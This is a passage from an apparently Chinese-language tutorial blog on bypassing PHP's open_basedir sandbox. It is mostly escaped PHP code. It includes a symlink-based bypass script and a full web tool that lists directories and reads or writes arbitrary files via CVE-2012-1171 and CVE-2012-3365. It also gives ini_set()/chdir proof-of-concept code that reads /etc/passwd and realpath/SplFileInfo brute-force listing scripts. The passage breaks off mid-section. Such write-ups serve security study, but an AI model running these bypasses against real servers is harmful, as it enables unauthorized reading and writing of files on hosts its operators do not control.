&#123;     chdir(&#39;..&#39;);&#125;$paths &#x3D; explode(&#39;&#x2F;&#39;, $relat_file);$j &#x3D; 0;for ($i &#x3D; 0; $paths[$i] &#x3D;&#x3D; &#39;..&#39;; $i++) &#123;     mkdir($name);    chdir($name);    $j++;&#125;for ($i &#x3D; 0; $i &lt;&#x3D; $j; $i++) &#123;     chdir(&#39;..&#39;);&#125;$tmp &#x3D; array_fill(0, $j + 1, $name);symlink(implode(&#39;&#x2F;&#39;, $tmp), &#39;tmplink&#39;);$tmp &#x3D; array_fill(0, $j, &#39;..&#39;);symlink(&#39;tmplink&#x2F;&#39; . implode(&#39;&#x2F;&#39;, $tmp) . $file, $exp);unlink(&#39;tmplink&#39;);mkdir(&#39;tmplink&#39;);delfile($name);$exp &#x3D; dirname($_SERVER[&#39;SCRIPT_NAME&#39;]) . &quot;&#x2F;&#123;$exp&#125;&quot;;$exp &#x3D; &quot;http:&#x2F;&#x2F;&#123;$_SERVER[&#39;SERVER_NAME&#39;]&#125;&#123;$exp&#125;&quot;;echo &quot;\n-----------------content---------------\n\n&quot;;echo file_get_contents($exp);delfile(&#39;tmplink&#39;);function getRelativePath($from, $to) &#123;  &#x2F;&#x2F; some compatibility fixes for Windows paths  $from &#x3D; rtrim($from, &#39;\&#x2F;&#39;) . &#39;&#x2F;&#39;;  $from &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $from);  $to   &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $to);  $from   &#x3D; explode(&#39;&#x2F;&#39;, $from);  $to     &#x3D; explode(&#39;&#x2F;&#39;, $to);  $relPath  &#x3D; $to;  foreach($from as $depth &#x3D;&gt; $dir) &#123;    &#x2F;&#x2F; find first non-matching dir    if($dir &#x3D;&#x3D;&#x3D; $to[$depth]) &#123;      &#x2F;&#x2F; ignore this directory      array_shift($relPath);    &#125; else &#123;      &#x2F;&#x2F; get number of remaining dirs to $from      $remaining &#x3D; count($from) - $depth;      if($remaining &gt; 1) &#123;        &#x2F;&#x2F; add traversals up to first matching dir        $padLength &#x3D; (count($relPath) + $remaining - 1) * -1;        $relPath &#x3D; array_pad($relPath, $padLength, &#39;..&#39;);        break;      &#125; else &#123;        $relPath[0] &#x3D; &#39;.&#x2F;&#39; . $relPath[0];      &#125;    &#125;  &#125;  return implode(&#39;&#x2F;&#39;, $relPath);&#125;function delfile($deldir)&#123;    if (@is_file($deldir)) &#123;        @chmod($deldir,0777);        return @unlink($deldir);    &#125;else if(@is_dir($deldir))&#123;        if(($mydir &#x3D; @opendir($deldir)) &#x3D;&#x3D; NULL) return false;        while(false !&#x3D;&#x3D; ($file &#x3D; @readdir($mydir)))        &#123;            $name &#x3D; File_Str($deldir.&#39;&#x2F;&#39;.$file);            if(($file!&#x3D;&#39;.&#39;) &amp;&amp; ($file!&#x3D;&#39;..&#39;))&#123;delfile($name);&#125;        &#125;         @closedir($mydir);        @chmod($deldir,0777);        return @rmdir($deldir) ? true : false;    &#125;&#125;function File_Str($string)&#123;    return str_replace(&#39;&#x2F;&#x2F;&#39;,&#39;&#x2F;&#39;,str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,$string));&#125;function getRandStr($length &#x3D; 6) &#123;    $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;    $randStr &#x3D; &#39;&#39;;    for ($i &#x3D; 0; $i &lt; $length; $i++) &#123;        $randStr .&#x3D; substr($chars, mt_rand(0, strlen($chars) - 1), 1);    &#125;    return $randStr;&#125;&lt;?php&#x2F;* PHP open_basedir bypass collection Works with &gt;&#x3D; PHP5 By &#x2F;fd, @filedescriptor(https:&#x2F;&#x2F;twitter.com&#x2F;filedescriptor) *&#x2F;&#x2F;&#x2F; Assistant functionsfunction getRelativePath($from, $to) &#123;&#x2F;&#x2F; some compatibility fixes for Windows paths$from &#x3D; rtrim($from, &#39;\&#x2F;&#39;) . &#39;&#x2F;&#39;;$from &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $from);$to &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $to);$from &#x3D; explode(&#39;&#x2F;&#39;, $from);$to &#x3D; explode(&#39;&#x2F;&#39;, $to);$relPath &#x3D; $to;foreach ($from as $depth &#x3D;&gt; $dir) &#123;&#x2F;&#x2F; find first non-matching dirif ($dir &#x3D;&#x3D;&#x3D; $to[$depth]) &#123;&#x2F;&#x2F; ignore this directoryarray_shift($relPath);&#125; else &#123;&#x2F;&#x2F; get number of remaining dirs to $from$remaining &#x3D; count($from) - $depth;if ($remaining &gt; 1) &#123;&#x2F;&#x2F; add traversals up to first matching dir$padLength &#x3D; (count($relPath) + $remaining - 1) * -1;$relPath &#x3D; array_pad($relPath, $padLength, &#39;..&#39;);break;&#125; else &#123;$relPath[0] &#x3D; &#39;.&#x2F;&#39; . $relPath[0];&#125;&#125;&#125;return implode(&#39;&#x2F;&#39;, $relPath);&#125;function fallback($classes) &#123;foreach ($classes as $class) &#123;$object &#x3D; new $class;if ($object-&gt;isAvailable()) &#123;return $object;&#125;&#125;return new NoExploit;&#125;&#x2F;&#x2F; Core classesinterface Exploitable &#123;function isAvailable();function getDescription();&#125;class NoExploit implements Exploitable &#123;function isAvailable() &#123;return true;&#125;function getDescription() &#123;return &#39;No exploit is available.&#39;;&#125;&#125;abstract class DirectoryLister implements Exploitable &#123;var $currentPath;function isAvailable() &#123;&#125;function getDescription() &#123;&#125;function getFileList() &#123;&#125;function setCurrentPath($currentPath) &#123;$this-&gt;currentPath &#x3D; $currentPath;&#125;function getCurrentPath() &#123;return $this-&gt;currentPath;&#125;&#125;class GlobWrapperDirectoryLister extends DirectoryLister &#123;function isAvailable() &#123;return stripos(PHP_OS, &#39;win&#39;) &#x3D;&#x3D;&#x3D; FALSE &amp;&amp; in_array(&#39;glob&#39;, stream_get_wrappers());&#125;function getDescription() &#123;return &#39;Directory listing via glob pattern&#39;;&#125;function getFileList() &#123;$file_list &#x3D; array();&#x2F;&#x2F; normal files$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#123;$this-&gt;getCurrentPath()&#125;*&quot;);foreach ($it as $f) &#123;$file_list[] &#x3D; $f-&gt;__toString();&#125;&#x2F;&#x2F; special files (starting with a dot(.))$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#123;$this-&gt;getCurrentPath()&#125;.*&quot;);foreach ($it as $f) &#123;$file_list[] &#x3D; $f-&gt;__toString();&#125;sort($file_list);return $file_list;&#125;&#125;class RealpathBruteForceDirectoryLister extends DirectoryLister &#123;var $characters &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789-_&#39;, $extension &#x3D; array(), $charactersLength &#x3D; 38, $maxlength &#x3D; 3, $fileList &#x3D; array();function isAvailable() &#123;return ini_get(&#39;open_basedir&#39;) &amp;&amp; function_exists(&#39;realpath&#39;);&#125;function getDescription() &#123;return &#39;Directory listing via brute force searching with realpath function.&#39;;&#125;function setCharacters($characters) &#123;$this-&gt;characters &#x3D; $characters;$this-&gt;charactersLength &#x3D; count($characters);&#125;function setExtension($extension) &#123;$this-&gt;extension &#x3D; $extension;&#125;function setMaxlength($maxlength) &#123;$this-&gt;maxlength &#x3D; $maxlength;&#125;function getFileList() &#123;set_time_limit(0);set_error_handler(array(__CLASS__, &#39;handler&#39;));$number_set &#x3D; array();while (count($number_set &#x3D; $this-&gt;nextCombination($number_set, 0)) &lt;&#x3D; $this-&gt;maxlength) &#123;$this-&gt;searchFile($number_set);&#125;sort($this-&gt;fileList);return $this-&gt;fileList;&#125;function nextCombination($number_set, $length) &#123;if (!isset($number_set[$length])) &#123;$number_set[$length] &#x3D; 0;return $number_set;&#125;if ($number_set[$length] + 1 &#x3D;&#x3D;&#x3D; $this-&gt;charactersLength) &#123;$number_set[$length] &#x3D; 0;$number_set &#x3D; $this-&gt;nextCombination($number_set, $length + 1);&#125; else &#123;$number_set[$length]++;&#125;return $number_set;&#125;function searchFile($number_set) &#123;$file_name &#x3D; &#39;a&#39;;foreach ($number_set as $key &#x3D;&gt; $value) &#123;$file_name[$key] &#x3D; $this-&gt;characters[$value];&#125;&#x2F;&#x2F; normal filesrealpath($this-&gt;getCurrentPath() . $file_name);&#x2F;&#x2F; files with preceeding dotrealpath($this-&gt;getCurrentPath() . &#39;.&#39; . $file_name);&#x2F;&#x2F; files with extensionforeach ($this-&gt;extension as $extension) &#123;realpath($this-&gt;getCurrentPath() . $file_name . $extension);&#125;&#125;function handler($errno, $errstr, $errfile, $errline) &#123;$regexp &#x3D; &#39;&#x2F;File\((.*)\) is not within&#x2F;&#39;;preg_match($regexp, $errstr, $matches);if (isset($matches[1])) &#123;$this-&gt;fileList[] &#x3D; $matches[1];&#125;&#125;&#125;abstract class FileWriter implements Exploitable &#123;var $filePath;function isAvailable() &#123;&#125;function getDescription() &#123;&#125;function write($content) &#123;&#125;function setFilePath($filePath) &#123;$this-&gt;filePath &#x3D; $filePath;&#125;function getFilePath() &#123;return $this-&gt;filePath;&#125;&#125;abstract class FileReader implements Exploitable &#123;var $filePath;function isAvailable() &#123;&#125;function getDescription() &#123;&#125;function read() &#123;&#125;function setFilePath($filePath) &#123;$this-&gt;filePath &#x3D; $filePath;&#125;function getFilePath() &#123;return $this-&gt;filePath;&#125;&#125;&#x2F;&#x2F; Assistant class for DOMFileWriter &amp; DOMFileReaderclass StreamExploiter &#123;var $mode, $filePath, $fileContent;function stream_close() &#123;$doc &#x3D; new DOMDocument;$doc-&gt;strictErrorChecking &#x3D; false;switch ($this-&gt;mode) &#123;case &#39;w&#39;:$doc-&gt;loadHTML($this-&gt;fileContent);$doc-&gt;removeChild($doc-&gt;firstChild);$doc-&gt;saveHTMLFile($this-&gt;filePath);break;default:case &#39;r&#39;:$doc-&gt;resolveExternals &#x3D; true;$doc-&gt;substituteEntities &#x3D; true;$doc-&gt;loadXML(&quot;&lt;!DOCTYPE doc [&lt;!ENTITY file SYSTEM \&quot;file:&#x2F;&#x2F;&#123;$this-&gt;filePath&#125;\&quot;&gt;]&gt;&lt;doc&gt;&amp;file;&lt;&#x2F;doc&gt;&quot;, LIBXML_PARSEHUGE);echo $doc-&gt;documentElement-&gt;firstChild-&gt;nodeValue;&#125;&#125;function stream_open($path, $mode, $options, &amp;$opened_path) &#123;$this-&gt;filePath &#x3D; substr($path, 10);$this-&gt;mode &#x3D; $mode;return true;&#125;public function stream_write($data) &#123;$this-&gt;fileContent &#x3D; $data;return strlen($data);&#125;&#125;class DOMFileWriter extends FileWriter &#123;function isAvailable() &#123;return extension_loaded(&#39;dom&#39;) &amp;&amp; (version_compare(phpversion(), &#39;5.3.10&#39;, &#39;&lt;&#x3D;&#39;) || version_compare(phpversion(), &#39;5.4.0&#39;, &#39;&#x3D;&#39;));&#125;function getDescription() &#123;return &#39;Write to and create a file exploiting CVE-2012-1171 (allow overriding). Notice the content should be in well-formed XML format.&#39;;&#125;function write($content) &#123;&#x2F;&#x2F; set it to global resource in order to trigger RSHUTDOWNglobal $_DOM_exploit_resource;stream_wrapper_register(&#39;exploit&#39;, &#39;StreamExploiter&#39;);$_DOM_exploit_resource &#x3D; fopen(&quot;exploit:&#x2F;&#x2F;&#123;$this-&gt;getFilePath()&#125;&quot;, &#39;w&#39;);fwrite($_DOM_exploit_resource, $content);&#125;&#125;class DOMFileReader extends FileReader &#123;function isAvailable() &#123;return extension_loaded(&#39;dom&#39;) &amp;&amp; (version_compare(phpversion(), &#39;5.3.10&#39;, &#39;&lt;&#x3D;&#39;) || version_compare(phpversion(), &#39;5.4.0&#39;, &#39;&#x3D;&#39;));&#125;function getDescription() &#123;return &#39;Read a file exploiting CVE-2012-1171. Notice the content should be in well-formed XML format.&#39;;&#125;function read() &#123;&#x2F;&#x2F; set it to global resource in order to trigger RSHUTDOWNglobal $_DOM_exploit_resource;stream_wrapper_register(&#39;exploit&#39;, &#39;StreamExploiter&#39;);$_DOM_exploit_resource &#x3D; fopen(&quot;exploit:&#x2F;&#x2F;&#123;$this-&gt;getFilePath()&#125;&quot;, &#39;r&#39;);&#125;&#125;class SqliteFileWriter extends FileWriter &#123;function isAvailable() &#123;return is_writable(getcwd())&amp;&amp; (extension_loaded(&#39;sqlite3&#39;) || extension_loaded(&#39;sqlite&#39;))&amp;&amp; (version_compare(phpversion(), &#39;5.3.15&#39;, &#39;&lt;&#x3D;&#39;) || (version_compare(phpversion(), &#39;5.4.5&#39;, &#39;&lt;&#x3D;&#39;) &amp;&amp; PHP_MINOR_VERSION &#x3D;&#x3D; 4));&#125;function getDescription() &#123;return &#39;Create a file with custom content exploiting CVE-2012-3365 (disallow overriding). Junk contents may be inserted&#39;;&#125;function write($content) &#123;$sqlite_class &#x3D; extension_loaded(&#39;sqlite3&#39;) ? &#39;sqlite3&#39; : &#39;SQLiteDatabase&#39;;mkdir(&#39;:memory:&#39;);$payload_path &#x3D; getRelativePath(getcwd() . &#39;&#x2F;:memory:&#39;, $this-&gt;getFilePath());$payload &#x3D; str_replace(&#39;\&#39;&#39;, &#39;\&#39;\&#39;&#39;, $content);$database &#x3D; new $sqlite_class(&quot;:memory:&#x2F;&#123;$payload_path&#125;&quot;);$database-&gt;exec(&quot;CREATE TABLE foo (bar STRING)&quot;);$database-&gt;exec(&quot;INSERT INTO foo (bar) VALUES (&#39;&#123;$payload&#125;&#39;)&quot;);$database-&gt;close();rmdir(&#39;:memory:&#39;);&#125;&#125;&#x2F;&#x2F; End of Core?&gt;&lt;?php$action &#x3D; isset($_GET[&#39;action&#39;]) ? $_GET[&#39;action&#39;] : &#39;&#39;;$cwd &#x3D; isset($_GET[&#39;cwd&#39;]) ? $_GET[&#39;cwd&#39;] : getcwd();$cwd &#x3D; rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;$directorLister &#x3D; fallback(array(&#39;GlobWrapperDirectoryLister&#39;, &#39;RealpathBruteForceDirectoryLister&#39;));$fileWriter &#x3D; fallback(array(&#39;DOMFileWriter&#39;, &#39;SqliteFileWriter&#39;));$fileReader &#x3D; fallback(array(&#39;DOMFileReader&#39;));$append &#x3D; &#39;&#39;;?&gt;&lt;style&gt;#panel &#123;  height: 200px;  overflow: hidden;&#125;#panel &gt; pre &#123;  margin: 0;  height: 200px;&#125;&lt;&#x2F;style&gt;&lt;div id&#x3D;&quot;panel&quot;&gt;&lt;pre id&#x3D;&quot;dl&quot;&gt;open_basedir: &lt;span style&#x3D;&quot;color: red&quot;&gt;&lt;?php echo ini_get(&#39;open_basedir&#39;) ? ini_get(&#39;open_basedir&#39;) : &#39;Off&#39;; ?&gt;&lt;&#x2F;span&gt;&lt;form style&#x3D;&quot;display:inline-block&quot; action&#x3D;&quot;&quot;&gt;&lt;fieldset&gt;&lt;legend&gt;Directory Listing:&lt;&#x2F;legend&gt;Current Directory: &lt;input name&#x3D;&quot;cwd&quot; size&#x3D;&quot;100&quot; value&#x3D;&quot;&lt;?php echo $cwd; ?&gt;&quot;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Go&quot;&gt;&lt;?php if (get_class($directorLister) &#x3D;&#x3D;&#x3D; &#39;RealpathBruteForceDirectoryLister&#39;): ?&gt;&lt;?php$characters &#x3D; isset($_GET[&#39;characters&#39;]) ? $_GET[&#39;characters&#39;] : $directorLister-&gt;characters;$maxlength &#x3D; isset($_GET[&#39;maxlength&#39;]) ? $_GET[&#39;maxlength&#39;] : $directorLister-&gt;maxlength;$append &#x3D; &quot;&amp;characters&#x3D;&#123;$characters&#125;&amp;maxlength&#x3D;&#123;$maxlength&#125;&quot;;$directorLister-&gt;setMaxlength($maxlength);?&gt;Search Characters: &lt;input name&#x3D;&quot;characters&quot; size&#x3D;&quot;100&quot; value&#x3D;&quot;&lt;?php echo $characters; ?&gt;&quot;&gt;Maxlength of File: &lt;input name&#x3D;&quot;maxlength&quot; size&#x3D;&quot;1&quot; value&#x3D;&quot;&lt;?php echo $maxlength; ?&gt;&quot;&gt;&lt;?php endif;?&gt;Description      : &lt;strong&gt;&lt;?php echo $directorLister-&gt;getDescription(); ?&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;fieldset&gt;&lt;&#x2F;form&gt;&lt;&#x2F;pre&gt;&lt;?php$file_path &#x3D; isset($_GET[&#39;file_path&#39;]) ? $_GET[&#39;file_path&#39;] : &#39;&#39;;?&gt;&lt;pre id&#x3D;&quot;rf&quot;&gt;open_basedir: &lt;span style&#x3D;&quot;color: red&quot;&gt;&lt;?php echo ini_get(&#39;open_basedir&#39;) ? ini_get(&#39;open_basedir&#39;) : &#39;Off&#39;; ?&gt;&lt;&#x2F;span&gt;&lt;form style&#x3D;&quot;display:inline-block&quot; action&#x3D;&quot;&quot;&gt;&lt;fieldset&gt;&lt;legend&gt;Read File :&lt;&#x2F;legend&gt;File Path: &lt;input name&#x3D;&quot;file_path&quot; size&#x3D;&quot;100&quot; value&#x3D;&quot;&lt;?php echo $file_path; ?&gt;&quot;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Read&quot;&gt;Description: &lt;strong&gt;&lt;?php echo $fileReader-&gt;getDescription(); ?&gt;&lt;&#x2F;strong&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;rf&quot;&gt;&lt;&#x2F;fieldset&gt;&lt;&#x2F;form&gt;&lt;&#x2F;pre&gt;&lt;pre id&#x3D;&quot;wf&quot;&gt;open_basedir: &lt;span style&#x3D;&quot;color: red&quot;&gt;&lt;?php echo ini_get(&#39;open_basedir&#39;) ? ini_get(&#39;open_basedir&#39;) : &#39;Off&#39;; ?&gt;&lt;&#x2F;span&gt;&lt;form style&#x3D;&quot;display:inline-block&quot; action&#x3D;&quot;&quot;&gt;&lt;fieldset&gt;&lt;legend&gt;Write File :&lt;&#x2F;legend&gt;File Path   : &lt;input name&#x3D;&quot;file_path&quot; size&#x3D;&quot;100&quot; value&#x3D;&quot;&lt;?php echo $file_path; ?&gt;&quot;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Write&quot;&gt;File Content: &lt;textarea cols&#x3D;&quot;70&quot; name&#x3D;&quot;content&quot;&gt;&lt;&#x2F;textarea&gt;Description : &lt;strong&gt;&lt;?php echo $fileWriter-&gt;getDescription(); ?&gt;&lt;&#x2F;strong&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;wf&quot;&gt;&lt;&#x2F;fieldset&gt;&lt;&#x2F;form&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;div&gt;&lt;a href&#x3D;&quot;#dl&quot;&gt;Directory Listing&lt;&#x2F;a&gt; | &lt;a href&#x3D;&quot;#rf&quot;&gt;Read File&lt;&#x2F;a&gt; | &lt;a href&#x3D;&quot;#wf&quot;&gt;Write File&lt;&#x2F;a&gt;&lt;hr&gt;&lt;pre&gt;&lt;?php if ($action &#x3D;&#x3D;&#x3D; &#39;rf&#39;): ?&gt;&lt;plaintext&gt;&lt;?php$fileReader-&gt;setFilePath($file_path);echo $fileReader-&gt;read();?&gt;&lt;?php elseif ($action &#x3D;&#x3D;&#x3D; &#39;wf&#39;): ?&gt;&lt;?phpif (isset($_GET[&#39;content&#39;])) &#123;$fileWriter-&gt;setFilePath($file_path);$fileWriter-&gt;write($_GET[&#39;content&#39;]);echo &#39;The file should be written.&#39;;&#125; else &#123;echo &#39;Something goes wrong.&#39;;&#125;?&gt;&lt;?php else: ?&gt;&lt;ol&gt;&lt;?php$directorLister-&gt;setCurrentPath($cwd);$file_list &#x3D; $directorLister-&gt;getFileList();$parent_path &#x3D; dirname($cwd);echo &quot;&lt;li&gt;&lt;a href&#x3D;&#39;?cwd&#x3D;&#123;$parent_path&#125;&#123;$append&#125;#dl&#39;&gt;Parent&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;&quot;;if (count($file_list) &gt; 0) &#123;foreach ($file_list as $file) &#123;echo &quot;&lt;li&gt;&lt;a href&#x3D;&#39;?cwd&#x3D;&#123;$cwd&#125;&#123;$file&#125;&#123;$append&#125;#dl&#39;&gt;&#123;$file&#125;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;&quot;;&#125;&#125; else &#123;echo &#39;No files found. The path is probably not a directory.&#39;;&#125;?&gt;&lt;&#x2F;ol&gt;&lt;?php endif;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用ini-set-绕过（比较常用）"><a href="#利用ini-set-绕过（比较常用）" class="headerlink" title="利用ini_set()绕过（比较常用）"></a>利用ini_set()绕过（比较常用）</h2><h3 id="ini-set-函数"><a href="#ini-set-函数" class="headerlink" title="ini_set()函数"></a>ini_set()函数</h3><p><strong>ini_set()用来设置php.ini的值</strong>，在函数执行的时候生效，脚本结束后，设置失效。<strong>无需打开php.ini文件，就能修改配置</strong>。函数用法如下:</p><pre class="line-numbers language-none"><code class="language-none">ini_set ( string $varname , string $newvalue ) : string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>varname是需要设置的值</li><li>newvalue是设置成为新的值</li><li>成功时返回旧的值，失败时返回 FALSE。</li></ul><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>当前我们处在&#x2F;var&#x2F;www&#x2F;html文件夹下，对应的POC为:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpmkdir(&#39;Von&#39;);  &#x2F;&#x2F;创建一个目录Vonchdir(&#39;Von&#39;);  &#x2F;&#x2F;切换到Von目录下ini_set(&#39;open_basedir&#39;,&#39;..&#39;);  &#x2F;&#x2F;把open_basedir切换到上层目录chdir(&#39;..&#39;);  &#x2F;&#x2F;以下这三步是把目录切换到根目录chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);  &#x2F;&#x2F;设置open_basedir为根目录(此时相当于没有设置open_basedir)echo file_get_contents(&#39;&#x2F;etc&#x2F;passwd&#39;);  &#x2F;&#x2F;读取&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，我们成功读取到了&#x2F;etc&#x2F;passwd<img src="/images/open_basedi_9.png" alt="img">至于POC的原理涉及到了PHP的底层实现，较为复杂，具体可以参考这几篇文章。<br><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#poc%E6%B5%8B%E8%AF%95">从PHP底层看open_basedir bypass</a><br><a href="https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/">php open_basedir 绕过poc分析</a><br><a href="https://xz.aliyun.com/t/4720">bypass open_basedir的新方法</a><br>这个我个人感觉是所有方法中最强的Payload了，思路很骚，操作也不难。(当然前提是没有被过滤掉相关函数hhhh)</p><h2 id="利用SplFileInfo-getRealPath-类方法绕过"><a href="#利用SplFileInfo-getRealPath-类方法绕过" class="headerlink" title="利用SplFileInfo::getRealPath()类方法绕过"></a>利用SplFileInfo::getRealPath()类方法绕过</h2><p>SplFileInfo类是PHP5.1.2之后引入的一个类，提供一个对文件进行操作的接口。我们在SplFileInfo的构造函数中传入文件相对路径，并且调用getRealPath即可获取文件的绝对路径。<br>这个方法有个特点：完全没有考虑open_basedir。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径。脚本如下:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$info &#x3D; new SplFileInfo(&#39;&#x2F;etc&#x2F;passwd&#39;);var_dump($info-&gt;getRealPath());?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>当传入的路径存在时，返回路径。</strong><img src="/images/open_basedir_10.png" alt="img">当传入的路径不存在时，返回False。<img src="/images/open_basedir_11.png" alt="img">但是如果我们完全不知道路径的情况下就和暴力猜解无异了，时间花费极高。在Windows系统下可以利用&lt;&gt;来列出所需目录下的文件，有P神的POC如下:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpini_set(&#39;open_basedir&#39;, dirname(__FILE__));printf(&quot;&lt;b&gt;open_basedir: %s&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&quot;, ini_get(&#39;open_basedir&#39;));$basedir &#x3D; &#39;D:&#x2F;test&#x2F;&#39;;$arr &#x3D; array();$chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;;for ($i&#x3D;0; $i &lt; strlen($chars); $i++) &#123;     $info &#x3D; new SplFileInfo($basedir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;);    $re &#x3D; $info-&gt;getRealPath();    if ($re) &#123;        dump($re);    &#125;&#125;function dump($s)&#123;    echo $s . &#39;&lt;br&#x2F;&gt;&#39;;    ob_flush();    flush();&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然由于&lt;&gt;&lt;是Windows特有的通配符。所以该POC只能在Windows环境下使用。Linux下只能暴力破解。</p><h2 id="利用realpath-绕过"><a href="#利用realpath-绕过" class="headerlink" title="利用realpath()绕过"></a>利用realpath()绕过</h2><p>realpath()函数和SplFileInfo::getRealPath()作用类似。同样是可以得到绝对路径。函数定义如下:</p><pre class="line-numbers language-none"><code class="language-none">realpath ( string $path ) : string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）。 